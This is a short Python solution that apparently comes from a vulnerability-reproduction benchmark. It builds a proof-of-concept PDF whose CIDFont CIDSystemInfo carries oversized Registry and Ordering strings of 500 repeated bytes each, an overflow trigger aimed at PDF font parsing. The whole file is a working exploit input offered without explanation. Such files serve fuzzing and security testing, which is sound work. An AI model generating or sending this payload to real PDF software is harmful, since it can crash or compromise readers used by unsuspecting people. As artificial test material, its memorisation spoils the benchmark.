class Solution:
    def solve(self, src_path: str) -> bytes:
        registry_content = b'A' * 500
        ordering_content = b'B' * 500
        registry_str = b'(' + registry_content + b')'
        ordering_str = b'(' + ordering_content + b')'
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n'
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n'
        obj3 = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n\n'
        obj4 = b'4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 100 700 Td (Hello) Tj ET\nendstream\nendobj\n\n'
        obj5 = b'5 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /CIDFont /DescendantFonts [6 0 R] /Encoding /Identity-H >>\nendobj\n\n'
        obj6 = b'6 0 obj\n<< /Type /Font /Subtype /CIDFontType0 /BaseFont /CIDFont /CIDSystemInfo 7 0 R /FontDescriptor 8 0 R /W [0 [1000]] >>\nendobj\n\n'
        obj7 = b'7 0 obj\n<< /Registry ' + registry_str + b' /Ordering ' + ordering_str + b' >>\nendobj\n\n'
        obj8 = b'8 0 obj\n<< /Type /FontDescriptor /FontName /CIDFont /Flags 32 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>\nendobj\n\n'
        header = b'%PDF-1.4\n'
        offset1 = len(header)
        offset2 = offset1 + len(obj1)
        offset3 = offset2 + len(obj2)
        offset4 = offset3 + len(obj3)
        offset5 = offset4 + len(obj4)
        offset6 = offset5 + len(obj5)
        offset7 = offset6 + len(obj6)
        offset8 = offset7 + len(obj7)
        xref_start = offset8 + len(obj8)
        body = header + obj1 + obj2 + obj3 + obj4 + obj5 + obj6 + obj7 + obj8
        xref = b'xref\n0 9\n0000000000 65535 f \n' + \
               f'{offset1:010d}'.encode() + b' 00000 n \n' + \
               f'{offset2:010d}'.encode() + b' 00000 n \n' + \
               f'{offset3:010d}'.encode() + b' 00000 n \n' + \
               f'{offset4:010d}'.encode() + b' 00000 n \n' + \
               f'{offset5:010d}'.encode() + b' 00000 n \n' + \
               f'{offset6:010d}'.encode() + b' 00000 n \n' + \
               f'{offset7:010d}'.encode() + b' 00000 n \n' + \
               f'{offset8:010d}'.encode() + b' 00000 n \n'
        trailer = b'trailer\n<< /Size 9 /Root 1 0 R >>\nstartxref\n' + f'{xref_start}\n'.encode() + b'%%EOF\n'
        poc = body + xref + trailer
        return poc